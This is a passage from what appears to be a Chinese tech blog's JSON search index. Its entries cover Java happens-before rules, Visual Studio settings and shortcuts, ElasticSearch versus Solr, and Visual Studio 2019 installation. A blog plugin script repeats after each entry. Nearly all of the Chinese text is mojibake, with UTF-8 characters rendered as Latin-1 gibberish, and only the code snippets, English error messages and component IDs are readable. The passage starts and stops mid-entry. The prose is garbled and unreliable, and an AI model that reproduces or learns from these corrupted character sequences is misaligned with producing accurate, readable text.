ä¸ºä¼šæœ‰åˆ†æ”¯ã€è·³è½¬ã€å¾ªç¯ç­‰ ç®¡ç¨‹é”å®šè§„åˆ™ï¼šä¸€ä¸ª unlock æ“ä½œå…ˆè¡Œå‘ç”Ÿäºåé¢å¯¹åŒä¸€ä¸ªé”çš„ lock æ“ä½œã€‚è¿™é‡Œå¿…é¡»æ³¨æ„çš„æ˜¯å¯¹åŒä¸€ä¸ªé”ï¼Œåé¢æ˜¯æŒ‡æ—¶é—´ä¸Šçš„åé¢ volatileå˜é‡è§„åˆ™ï¼šå¯¹ä¸€ä¸ª volatile å˜é‡çš„å†™æ“ä½œå…ˆè¡Œå‘ç”Ÿäºåé¢å¯¹è¿™ä¸ªå˜é‡çš„è¯»æ“ä½œï¼Œè¿™é‡Œçš„åé¢æ˜¯æŒ‡æ—¶é—´ä¸Šçš„å…ˆåé¡ºåº çº¿ç¨‹å¯åŠ¨è§„åˆ™ï¼šThread å¯¹è±¡çš„ start () æ–¹æ³•å…ˆè¡Œå‘ç”Ÿä¸è¯¥çº¿ç¨‹çš„æ¯ä¸ªåŠ¨ä½œã€‚å½“ç„¶å¦‚æœé”™è¯¯çš„ä½¿ç”¨äº†çº¿ç¨‹ï¼Œåˆ›å»ºçº¿ç¨‹åæ²¡æœ‰æ‰§è¡Œ start æ–¹æ³•ï¼Œè€Œæ˜¯æ‰§è¡Œ run æ–¹æ³•ï¼Œé‚£æ­¤å¥è¯æ˜¯ä¸æˆç«‹çš„ï¼Œä½†æ˜¯å¦‚æœè¿™æ ·å…¶å®ä¹Ÿä¸æ˜¯çº¿ç¨‹äº† çº¿ç¨‹ç»ˆæ­¢è§„åˆ™ï¼šçº¿ç¨‹ä¸­çš„æ‰€æœ‰æ“ä½œéƒ½å…ˆè¡Œå‘ç”Ÿä¸å¯¹æ­¤çº¿ç¨‹çš„ç»ˆæ­¢æ£€æµ‹ï¼Œå¯ä»¥é€šè¿‡ Thread.join () å’Œ Thread.isAlive () çš„è¿”å›å€¼ç­‰æ‰‹æ®µæ£€æµ‹çº¿ç¨‹æ˜¯å¦å·²ç»ç»ˆæ­¢æ‰§è¡Œ çº¿ç¨‹ä¸­æ–­è§„åˆ™ï¼šå¯¹çº¿ç¨‹ interrupt () æ–¹æ³•çš„è°ƒç”¨å…ˆè¡Œå‘ç”Ÿäºè¢«ä¸­æ–­çº¿ç¨‹çš„ä»£ç æ£€æµ‹åˆ°ä¸­æ–­äº‹ä»¶çš„å‘ç”Ÿï¼Œå¯ä»¥é€šè¿‡ Thread.interrupted () æ–¹æ³•æ£€æµ‹åˆ°æ˜¯å¦æœ‰ä¸­æ–­å‘ç”Ÿ å¯¹è±¡ç»ˆç»“è§„åˆ™ï¼šä¸€ä¸ªå¯¹è±¡çš„åˆå§‹åŒ–å®Œæˆå…ˆè¡Œå‘ç”Ÿäºä»–çš„ finalize æ–¹æ³•çš„æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯åˆå§‹åŒ–æ–¹æ³•å…ˆè¡Œå‘ç”Ÿäº finalize æ–¹æ³• ä¼ é€’æ€§è§„åˆ™ï¼šå¦‚æœæ“ä½œ A å…ˆè¡Œå‘ç”Ÿäºæ“ä½œ Bï¼Œæ“ä½œ B å…ˆè¡Œå‘ç”Ÿäºæ“ä½œ Cï¼Œé‚£ä¹ˆæ“ä½œ A å…ˆè¡Œå‘ç”Ÿäºæ“ä½œ C åœ¨ä¸‹è¿°çš„ä»£ç ä¸­ï¼Œå¦‚æœæœ‰ä¸¤ä¸ªçº¿ç¨‹ A å’Œ Bï¼ŒA å…ˆè°ƒç”¨ setValue æ–¹æ³•ï¼Œç„¶å B è°ƒç”¨ getValue æ–¹æ³•ï¼Œé‚£ä¹ˆ B çº¿ç¨‹æ‰§è¡Œæ–¹æ³•è¿”å›çš„ç»“æœæ˜¯ä»€ä¹ˆï¼Ÿ 123456789private int value = 0;public void setValue(int value) { this.value = value;}public int getValue() { return this.value;} å¯¹ç…§å…ˆè¡Œå‘ç”ŸåŸåˆ™ä¸€ä¸ªä¸€ä¸ªå¯¹æ¯”ã€‚é¦–å…ˆæ˜¯ç¨‹åºæ¬¡åºè§„åˆ™ï¼Œè¿™é‡Œæ˜¯å¤šçº¿ç¨‹ï¼Œä¸åœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­ï¼Œä¸é€‚ç”¨ï¼›ç„¶åæ˜¯ç®¡ç¨‹é”å®šè§„åˆ™ï¼Œè¿™é‡Œæ²¡æœ‰ synchronizedï¼Œè‡ªç„¶ä¸ä¼šå‘ç”Ÿ lock å’Œ unlockï¼Œä¸é€‚ç”¨ï¼›åé¢å¯¹äºçº¿ç¨‹å¯åŠ¨è§„åˆ™ã€çº¿ç¨‹ç»ˆæ­¢è§„åˆ™ã€çº¿ç¨‹ä¸­æ–­è§„åˆ™ä¹Ÿä¸é€‚ç”¨ï¼Œè¿™é‡Œä¸å¯¹è±¡ç»ˆç»“è§„åˆ™ã€ä¼ é€’æ€§è§„åˆ™ä¹Ÿæ²¡æœ‰å…³ç³»ã€‚æ‰€ä»¥è¯´ B è¿”å›çš„ç»“æœæ˜¯ä¸ç¡®å®šçš„ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹è¯¥æ“ä½œä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚å¦‚ä½•ä¿®æ”¹å‘¢ï¼Œä¸€ä¸ªæ˜¯å¯¹ getã€set æ–¹æ³•åŠ å…¥ synchronized å…³é”®å­—ï¼Œå³å¯ä»¥ä½¿ç”¨ç®¡ç¨‹é”å®šè§„åˆ™ï¼›è¦ä¹ˆå¯¹ value åŠ  volatile ä¿®é¥°ï¼Œå¯ä»¥ä½¿ç”¨ volatile å˜é‡è§„åˆ™ã€‚ é€šè¿‡ä¸Šé¢çš„ä¾‹å­å¯çŸ¥ï¼Œä¸€ä¸ªæ“ä½œæ—¶é—´ä¸Šå…ˆå‘ç”Ÿå¹¶ä¸ä»£è¡¨è¿™ä¸ªæ“ä½œå…ˆè¡Œå‘ç”Ÿï¼Œé‚£ä¹ˆä¸€ä¸ªæ“ä½œå…ˆè¡Œå‘ç”Ÿæ˜¯ä¸æ˜¯ä»£è¡¨è¿™ä¸ªæ“ä½œåœ¨æ—¶é—´ä¸Šå…ˆå‘ç”Ÿï¼Ÿä¹Ÿä¸æ˜¯ï¼Œå¦‚ä¸‹é¢çš„ä¾‹å­ï¼š 12int i = 2;int j = 1; åœ¨åŒä¸€ä¸ªçº¿ç¨‹å†…ï¼Œå¯¹ i çš„èµ‹å€¼å…ˆè¡Œå‘ç”Ÿäºå¯¹ j èµ‹å€¼çš„æ“ä½œï¼Œä½†æ˜¯ä»£ç é‡æ’åºä¼˜åŒ–ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯ j çš„èµ‹å€¼å…ˆå‘ç”Ÿï¼Œæˆ‘ä»¬æ— æ³•æ„ŸçŸ¥åˆ°è¿™ä¸€å˜åŒ–ã€‚ç»¼ä¸Šæ‰€è¿°ï¼Œæ—¶é—´å…ˆåé¡ºåºä¸å…ˆè¡Œå‘ç”ŸåŸåˆ™ä¹‹é—´åŸºæœ¬æ²¡æœ‰å¤ªå¤§å…³ç³»ã€‚æˆ‘ä»¬è¡¡é‡å¹¶å‘å®‰å…¨çš„é—®é¢˜çš„æ—¶å€™ä¸è¦å—åˆ°æ—¶é—´å…ˆåé¡ºåºçš„å¹²æ‰°ï¼Œä¸€åˆ‡ä»¥å…ˆè¡Œå‘ç”ŸåŸåˆ™ä¸ºå‡†ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java"},{title:"Visual Studio ä¹‹ä¸€å¸¸ç”¨é…ç½®ä¸ä½¿ç”¨",url:"/posts/ec73e38.html",text:'VS ç‰ˆæœ¬è¯´æ˜æœ¬æ–‡ä½¿ç”¨çš„ Visual Studio ç‰ˆæœ¬æ˜¯ Microsoft Visual Studio Community 2019 ç‰ˆæœ¬ 16.11.5ã€‚ ç•Œé¢æ“ä½œæ·»åŠ æºç ç›®å½•å°†æºç ç›®å½•æ‹·è´åˆ° VS çš„å·¥ç¨‹ç›®å½•ä¸‹ï¼Œè¿™æ—¶åœ¨ VS çš„å·¥ç¨‹ç›®å½•åˆ—è¡¨é‡Œæ˜¯çœ‹ä¸åˆ°æ–°å¢çš„ç›®å½•çš„ï¼Œåœ¨å¦‚ä¸‹å›¾å·¥å…·æ ä¸­ç‚¹å‡»å›¾æ ‡ æ˜¾ç¤ºæ‰€æœ‰æ–‡ä»¶ï¼Œæ‰å¯ä»¥çœ‹åˆ°æ–°å¢çš„ç›®å½• è¿™æ—¶æ–°å¢çš„æºç ç›®å½•è¿˜æ²¡æœ‰çœŸæ­£åœ°åŠ å…¥åˆ° VS çš„å·¥ç¨‹ä¸­æ¥ï¼Œå¯è§æ–°å¢çš„æ–‡ä»¶çš„å›¾æ ‡æ˜¯çº¢è‰²çš„ åœ¨æ–°å¢çš„æºç ç›®å½•ä¸Šå³é”®é€‰æ‹© åŒ…æ‹¬åœ¨é¡¹ç›®ä¸­ï¼Œæ–°å¢çš„æºç ç›®å½•å°±ä¼šåŠ å…¥åˆ° VS çš„å·¥ç¨‹ä¸­ æ–°å¢çš„æ–‡ä»¶çš„å›¾æ ‡æœ€ç»ˆæ‰ä¼šæ­£å¸¸æ˜¾ç¤º æ·»åŠ é¢„å¤„ç†å™¨å®šä¹‰è‹¥é¡¹ç›®ç¼–è¯‘å¤±è´¥ï¼Œå¹¶è¾“å‡ºå¦‚ä¸‹çš„é”™è¯¯æ—¥å¿—ä¿¡æ¯ï¼Œåˆ™å¯ä»¥å¯¼èˆªåˆ°èœå•æ ï¼šé¡¹ç›® -&gt; å±æ€§ -&gt; C/C++ -&gt; é¢„å¤„ç†å™¨ -&gt; é¢„å¤„ç†å™¨å®šä¹‰ -&gt; ç¼–è¾‘ï¼Œç„¶ååŠ å…¥ _CRT_SECURE_NO_WARNINGS å’Œ _CRT_NONSTDC_NO_DEPRECATE å³å¯ã€‚ 1é”™è¯¯ C4996 \'fopen\': This function or variable may be unsafe. Consider using fopen_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for details. å¸¸ç”¨å¿«æ·é”® f9ï¼šè®¾ç½®æ–­ç‚¹ f5ï¼šè°ƒè¯•è¿è¡Œ ctrl + f5ï¼šåªè¿è¡Œï¼Œä¸è°ƒè¯• ctrl + shift + bï¼šåªç¼–è¯‘ï¼Œä¸è¿è¡Œ ctrl + k + cï¼šæ³¨é‡Šä»£ç  ctrl + k + uï¼šå–æ¶ˆæ³¨é‡Šä»£ç  ctrl + k + fï¼šä»£ç æ ¼å¼åŒ– ctrl + shift + f æˆ–è€… ctrl + shift + hï¼šå…¨å±€æœç´¢æ–‡ä»¶å†…å®¹ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘å·¥å…·"},{title:"æœç´¢ä¸­é—´ä»¶é¢è¯•é¢˜ä¹‹ä¸€",url:"/posts/a03f47f2.html",text:'ElasticSearch å’Œ Solr çš„åŒºåˆ«ä¸¤è€…éƒ½æ˜¯åŸºäº Lucene æœç´¢æœåŠ¡å™¨å¼€å‘çš„ï¼Œæ˜¯ä¸€æ¬¾ä¼˜ç§€çš„ã€é«˜æ€§èƒ½çš„ä¼ä¸šçº§æœç´¢æœåŠ¡å™¨ï¼Œä¸”éƒ½æ˜¯åŸºäºåˆ†è¯æŠ€æœ¯æ„å»ºçš„å€’æ’ç´¢å¼•çš„æ–¹å¼è¿›è¡ŒæŸ¥è¯¢ï¼ŒåŒºåˆ«å¦‚ä¸‹ï¼š å½“å•çº¯åœ°å¯¹å·²æœ‰æ•°æ®è¿›è¡Œæ£€ç´¢çš„æ—¶å€™ï¼ŒSolr çš„æ•ˆç‡é«˜äº ES å½“å®æ—¶å»ºç«‹ç´¢å¼•çš„æ—¶å€™ï¼ŒSolr ä¼šäº§ç”Ÿ IO é˜»å¡ï¼Œè€Œ ES åˆ™ä¸ä¼šï¼ŒES çš„æŸ¥è¯¢æ€§èƒ½é«˜äº Solr åœ¨ä¸æ–­åŠ¨æ€æ·»åŠ æ•°æ®çš„æ—¶å€™ï¼ŒSolr çš„æ£€ç´¢æ•ˆç‡ä¼šå˜å¾—ä½ä¸‹ï¼Œè€Œ ES åˆ™æ²¡ä»€ä¹ˆå˜åŒ– Solr åˆ©ç”¨ ZooKeeper è¿›è¡Œåˆ†å¸ƒå¼ç®¡ç†ï¼Œè€Œ ES è‡ªå¸¦åˆ†å¸ƒå¼ç®¡ç†åŠŸèƒ½ï¼ŒSolr ä¸€èˆ¬éƒ½è¦éƒ¨ç½²åˆ° Web æœåŠ¡å™¨ä¸Šï¼ˆå¦‚ Tomcatï¼‰ï¼Œå¯åŠ¨ Tomcat çš„æ—¶å€™éœ€è¦é…ç½® Tomcat ä¸ Solr çš„å…³è” Solr æ”¯æŒæ›´å¤šçš„æ•°æ®æ ¼å¼ï¼ˆXMLã€JSONã€CSV ç­‰ï¼‰ï¼Œè€Œ ES ä»…æ”¯æŒ JSON æ–‡ä»¶æ ¼å¼ Solr æ˜¯ä¼ ç»Ÿæœç´¢åº”ç”¨çš„æœ‰åŠ›è§£å†³æ–¹æ¡ˆï¼Œä½†æ˜¯ ES æ›´é€‚ç”¨äºæ–°å…´çš„å®æ—¶æœç´¢åº”ç”¨ Solr å®˜ç½‘æä¾›çš„åŠŸèƒ½æ›´å¤šï¼Œè€Œ ES æœ¬èº«æ›´æ³¨é‡æ ¸å¿ƒåŠŸèƒ½ï¼Œé«˜çº§åŠŸèƒ½ä¸€èˆ¬ç”±ç¬¬ä¸‰æ–¹æ’ä»¶æä¾› var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ä¼ä¸šé¢è¯•"},{title:"Visual Studio 2019 ç¦»çº¿å®‰è£…",url:"/posts/f201bf82.html",text:'å‰è¨€æœ¬æ–‡ä»‹ç»çš„æ˜¯ VS ç¦»çº¿å®‰è£…ï¼Œç±»ä¼¼ ISO å®‰è£…ï¼Œå¯ä»¥è§£å†³å›  Internet è¿æ¥ä¸å¯é æˆ–å¸¦å®½è¾ƒä½ï¼Œå¯¼è‡´ VS å®‰è£…å¤±è´¥çš„é—®é¢˜ã€‚å…¶åŸç†æ˜¯ä½¿ç”¨å‘½ä»¤è¡Œåˆ›å»ºå®‰è£…æ–‡ä»¶çš„æœ¬åœ°ç¼“å­˜ï¼Œè¿™æ ·å°±å¯ä»¥å®ç°ä¸€æ¬¡ä¸‹è½½å¤šæ¬¡å®‰è£…ï¼ŒèŠ‚çœä¸‹è½½å®‰è£…æ–‡ä»¶æ‰€èŠ±çš„æ—¶é—´ã€‚ VS ç¦»çº¿å®‰è£…æ­¥éª¤ä¸€è®¿é—® VS å®˜ç½‘ï¼Œä¸‹è½½ VS çš„å®‰è£…å™¨ vs_community.exeï¼Œé€‰æ‹©ç¤¾åŒºç‰ˆï¼ˆå…è´¹ï¼‰å³å¯ã€‚ æ­¥éª¤äºŒé€šè¿‡å‘½ä»¤è¡Œï¼Œä½¿ç”¨ VS çš„å®‰è£…å™¨ vs_community.exe åˆ›å»ºï¼ˆä¸‹è½½ï¼‰å®‰è£…æ–‡ä»¶çš„æœ¬åœ°ç¼“å­˜ï¼Œå‘½ä»¤è¡Œçš„å„ä¸ªå‚æ•°è¯´æ˜å¦‚ä¸‹ï¼š --langï¼šæŒ‡å®šè¯­è¨€ -addï¼šä¸‹è½½å·¥ä½œè´Ÿè·ç»„ä»¶ --layoutï¼šæŒ‡å®šæœ¬åœ°ç¼“å­˜å­˜æ”¾çš„ç›®å½•è·¯å¾„ --includeRecommendedï¼šä¸‹è½½æ¨èçš„ç»„ä»¶ -â€“includeOptionalï¼šä¸‹è½½å¯é€‰çš„ç»„ä»¶ï¼Œæ¯”è¾ƒå ç£ç›˜ç©ºé—´ï¼Œä¸å»ºè®®ä½¿ç”¨ 1vs_community.exe --layout G:\\VisualStudio\\Packages -add Microsoft.VisualStudio.Workload.ManagedDesktop -add Microsoft.VisualStudio.Workload.NativeDesktop -add Microsoft.VisualStudio.Workload.Universal --includeRecommended --lang en-US zh-CN è‹¥æ˜¯ C++ å¼€å‘ï¼Œä¸€èˆ¬é€‰æ‹©å®‰è£… Microsoft.VisualStudio.Workload.ManagedDesktopã€Microsoft.VisualStudio.Workload.NativeDesktopã€Microsoft.VisualStudio.Workload.Universal è¿™ä¸‰å¤§ç»„ä»¶å³å¯ï¼Œåˆ†åˆ«å¯¹åº”ä¸‹å›¾ä¸­å·²å‹¾é€‰çš„ç»„ä»¶ï¼ŒVS çš„ç»„ä»¶åˆ—è¡¨å¯ä»¥çœ‹è¿™é‡Œã€‚ æ­¥éª¤ä¸‰ä¸‹è½½å®Œæˆåï¼Œè¿›å…¥ä¸Šé¢å‘½ä»¤è¡Œä¸­ --layout å‚æ•°æ‰€æŒ‡å®šçš„æ–‡ä»¶å¤¹ä¸‹ï¼ŒåŒå‡» vs_setup.exe è¿›è¡Œå®‰è£… (adsbygoogle = window.adsbygoogle || []).push({}); æ­¥éª¤å››ç­‰å¾…æ–‡ä»¶æå–å®Œæˆï¼Œæ˜¾ç¤º VS çš„å®‰è£…ç•Œé¢ æ­¥éª¤äº”é€‰æ‹©å®‰è£…ä½ç½®ï¼Œè¯·ç¡®ä¿å®‰è£…ä½ç½®æ‰€åœ¨çš„ç£ç›˜æœ‰è¶³å¤Ÿçš„ç©ºé—´ï¼Œç„¶åç‚¹å‡» å®‰è£… æŒ‰é’®å¼€å§‹å®‰è£…ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™é‡Œä¸€èˆ¬ä¸å†éœ€è¦åœ¨å®‰è£…ç•Œé¢ä¸Šçš„ å·¥ä½œè´Ÿè·ã€å•ä¸ªç»„ä»¶ã€è¯­è¨€åŒ… é¡µé¢é‡Œï¼Œæ‰‹åŠ¨å‹¾é€‰ä»»ä½•å†…å®¹ã€‚ VS åˆ›å»º C++ é¡¹ç›® VS åˆ›å»º C++ é¡¹ç›® VS å„å¤§ç»„ä»¶çš„é™„å½•12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879Visual Studio æ ¸å¿ƒç¼–è¾‘å™¨IDï¼š Microsoft.VisualStudio.Workload.CoreEditorè¯´æ˜ï¼š Visual Studio æ ¸å¿ƒ shell ä½“éªŒï¼ŒåŒ…æ‹¬è¯­æ³•æ„ŸçŸ¥ä»£ç ç¼–è¾‘ã€æºä»£ç ç®¡ç†å’Œå·¥ä½œé¡¹ç®¡ç†ã€‚Azure å¼€å‘IDï¼š Microsoft.VisualStudio.Workload.Azureè¯´æ˜ï¼šç”¨äºå¼€å‘äº‘åº”ç”¨ã€åˆ›å»ºèµ„æºä»¥åŠç”ŸæˆåŒ…æ‹¬ Docker æ”¯æŒçš„å®¹å™¨çš„ Azure SDKã€å·¥å…·å’Œé¡¹ç›®ã€‚æ•°æ®å­˜å‚¨å’Œå¤„ç†IDï¼š Microsoft.VisualStudio.Workload.Dataè¯´æ˜ï¼š ä½¿ç”¨ SQL Serverã€Azure Data Lake æˆ– Hadoop è¿æ¥ã€å¼€å‘å’Œæµ‹è¯•æ•°æ®è§£å†³æ–¹æ¡ˆã€‚æ•°æ®ç§‘å­¦å’Œåˆ†æåº”ç”¨ç¨‹åºIDï¼š Microsoft.VisualStudio.Workload.DataScienceè¯´æ˜ï¼š ç”¨äºåˆ›å»ºæ•°æ®ç§‘å­¦åº”ç”¨ç¨‹åºçš„è¯­è¨€å’Œå·¥å…·ï¼ˆåŒ…æ‹¬ Pythonã€R å’Œ F#ï¼‰ã€‚.NET æ¡Œé¢å¼€å‘IDï¼š Microsoft.VisualStudio.Workload.ManagedDesktopè¯´æ˜ï¼š ä½¿ç”¨ C#ã€Visual Basic å’Œ F# ç”Ÿæˆ WPFã€Windows çª—ä½“å’Œæ§åˆ¶å°åº”ç”¨ç¨‹åºã€‚ä½¿ç”¨ Unity çš„æ¸¸æˆå¼€å‘IDï¼š Microsoft.VisualStudio.Workload.ManagedGameè¯´æ˜ï¼š ä½¿ç”¨ Unityï¼ˆåŠŸèƒ½å¼ºå¤§çš„è·¨å¹³å°å¼€å‘ç¯å¢ƒï¼‰åˆ›å»º 2D å’Œ 3D æ¸¸æˆã€‚ä½¿ç”¨ C++ çš„ Linux å¼€å‘IDï¼š Microsoft.VisualStudio.Workload.NativeCrossPlatè¯´æ˜ï¼š åˆ›å»ºå’Œè°ƒè¯•åœ¨ Linux ç¯å¢ƒä¸­è¿è¡Œçš„åº”ç”¨ç¨‹åºã€‚ä½¿ç”¨ C++ çš„æ¡Œé¢å¼€å‘IDï¼š Microsoft.VisualStudio.Workload.NativeDesktopè¯´æ˜ï¼šä½¿ç”¨ Microsoft C++ å·¥å…·é›†ã€ATL æˆ– MFC ç”Ÿæˆ Windows æ¡Œé¢åº”ç”¨ç¨‹åºã€‚ä½¿ç”¨ C++ çš„æ¸¸æˆå¼€å‘IDï¼š Microsoft.VisualStudio.Workload.NativeGameè¯´æ˜ï¼š ä»¥ DirectXã€Unreal æˆ– Cocos2d ä¸ºåç›¾ï¼Œåˆ©ç”¨ C++ çš„å¼ºå¤§åŠŸèƒ½ç”Ÿæˆä¸“ä¸šæ¸¸æˆã€‚ä½¿ç”¨ C++ çš„ç§»åŠ¨å¼€å‘IDï¼š Microsoft.VisualStudio.Workload.NativeMobileè¯´æ˜ï¼š ä½¿ç”¨ C++ ç”Ÿæˆé€‚ç”¨äº iOSã€Android æˆ– Windows çš„è·¨å¹³å°åº”ç”¨ç¨‹åºã€‚.NET Core è·¨å¹³å°å¼€å‘IDï¼š Microsoft.VisualStudio.Workload.NetCoreToolsè¯´æ˜ï¼š ä½¿ç”¨ .NET Coreã€ASP.NET Coreã€HTML/JavaScript å’ŒåŒ…æ‹¬ Docker æ”¯æŒçš„å®¹å™¨ç”Ÿæˆè·¨å¹³å°åº”ç”¨ç¨‹åºã€‚ä½¿ç”¨ .NET çš„ç§»åŠ¨å¼€å‘IDï¼š Microsoft.VisualStudio.Workload.NetCrossPlatè¯´æ˜ï¼š ä½¿ç”¨ Xmarin ç”Ÿæˆé€‚ç”¨äº iOSã€Android æˆ– Windows çš„è·¨å¹³å°åº”ç”¨ç¨‹åºã€‚ASP.NET å’Œ Web å¼€å‘IDï¼š Microsoft.VisualStudio.Workload.NetWebè¯´æ˜ï¼š ä½¿ç”¨ ASP.NETã€ASP.NET Coreã€HTML/JavaScript å’ŒåŒ…æ‹¬ Docker æ”¯æŒçš„å®¹å™¨ç”Ÿæˆ Web åº”ç”¨ç¨‹åºã€‚Node.js å¼€å‘IDï¼š Microsoft.VisualStudio.Workload.Nodeè¯´æ˜ï¼š ä½¿ç”¨ Node.jsï¼ˆäº‹ä»¶é©±åŠ¨çš„å¼‚æ­¥ JavaScript è¿è¡Œæ—¶ï¼‰ç”Ÿæˆå¯æ‰©å±•çš„ç½‘ç»œåº”ç”¨ç¨‹åºã€‚Office/SharePoint å¼€å‘IDï¼š Microsoft.VisualStudio.Workload.Officeè¯´æ˜ï¼š ä½¿ç”¨ C#ã€VB å’Œ JavaScript åˆ›å»º Office å’Œ SharePoint å¤–æ¥ç¨‹åºã€SharePoint è§£å†³æ–¹æ¡ˆå’Œ VSTO å¤–æ¥ç¨‹åºã€‚Python å¼€å‘IDï¼š Microsoft.VisualStudio.Workload.Pythonè¯´æ˜ï¼š é€‚ç”¨äº Python çš„ç¼–è¾‘ã€è°ƒè¯•ã€äº¤äº’å¼å¼€å‘å’Œæºä»£ç ç®¡ç†ã€‚é€šç”¨ Windows å¹³å°å¼€å‘IDï¼š Microsoft.VisualStudio.Workload.Universalè¯´æ˜ï¼š ä½¿ç”¨ C#ã€VB å’Œ JavaScript æˆ– C++ï¼ˆå¯é€‰ï¼‰åˆ›å»ºé€‚ç”¨äºé€šç”¨ Windows å¹³å°çš„åº”ç”¨ç¨‹åºã€‚Visual Studio æ‰©å±•å¼€å‘IDï¼š Microsoft.VisualStudio.Workload.VisualStudioExtensionè¯´æ˜ï¼š åˆ›å»ºé€‚ç”¨äº Visual Studio çš„åŠ è½½é¡¹å’Œæ‰©å±•ï¼ŒåŒ…æ‹¬æ–°å‘½ä»¤ã€ä»£ç åˆ†æå™¨å’Œå·¥å…·çª—å£ã€‚ä½¿ç”¨ JavaScript çš„ç§»åŠ¨å¼€å‘IDï¼š Microsoft.VisualStudio.Workload.WebCrossPlatè¯´æ˜ï¼š ä½¿ç”¨ç”¨äº Apache Cordova çš„å·¥å…·ç”Ÿæˆ Androidã€iOS å’Œ UWP åº”ç”¨ã€‚Visual Studio å¸®åŠ©æŸ¥çœ‹å™¨ID: Microsoft.Component.HelpViewerè¯´æ˜ï¼šVS çš„å¸®åŠ©æŸ¥çœ‹å™¨ã€‚ å‚è€ƒèµ„æ–™ Visual Studio 2019 åœ¨çº¿å®‰è£… VS2019 ç¦»çº¿å®‰è£…æ–¹æ³•è¯¦è§£ Visual Studio 2019 è„±æœºå®‰è£… var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘å·¥å…·"},{title:"Visual Studio 2019 åœ¨çº¿å®‰è£…",url:"/posts/71979ec9.html",text:'ä¸‹è½½ VS å®‰è£…å™¨è®¿é—® VS å®˜ç½‘ï¼Œé€‰æ‹©ç¤¾åŒºç‰ˆï¼ˆå…è´¹ï¼‰è¿›è¡Œä¸‹è½½ å®‰è£… VSæ­¥éª¤ä¸€ç›´æ¥åŒå‡» â€œvs_community.exeâ€ è¿è¡Œ VS å®‰è£…å™¨ æ­¥éª¤äºŒç­‰å¾…æ–‡ä»¶æå–å®Œæˆï¼Œæ˜¾ç¤º VS çš„å®‰è£…ç•Œé¢ æ­¥éª¤ä¸‰æ ¹æ®è‡ªå·±çš„å¼€å‘éœ€è¦ï¼Œé€‰æ‹©å¯¹åº”çš„å·¥ä½œè´Ÿè·ç»„ä»¶ï¼Œè‹¥æ˜¯å¼€å‘ C++ï¼Œä¸€èˆ¬å‹¾é€‰ä¸‹å›¾ä¸­çš„ä¸‰é¡¹å³å¯ æ­¥éª¤å››é€‰æ‹©å•ä¸ªç»„ä»¶ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è¿™é‡Œä¸éœ€è¦æ‰‹åŠ¨å‹¾é€‰ æ­¥éª¤äº”é€‰æ‹©è¯­è¨€åŒ…ï¼Œå»ºè®®é€‰æ‹© â€œä¸­æ–‡ï¼ˆç®€ä½“ï¼‰â€ å’Œ â€œè‹±è¯­â€ æ­¥éª¤å…­é€‰æ‹©å®‰è£…ä½ç½®ï¼Œè¯·ç¡®ä¿å®‰è£…ä½ç½®æ‰€åœ¨çš„ç£ç›˜æœ‰è¶³å¤Ÿçš„ç©ºé—´ï¼Œç„¶åç‚¹å‡» â€œå®‰è£…â€ æŒ‰é’®å¼€å§‹å®‰è£…å³å¯ (adsbygoogle = window.adsbygoogle || []).push({}); VS åˆ›å»º C++ é¡¹ç›®æ­¥éª¤ä¸€è¿è¡Œ VS çš„ä¸»ç¨‹åºï¼Œé€‰æ‹© â€œåˆ›å»ºæ–°é¡¹ç›®â€ 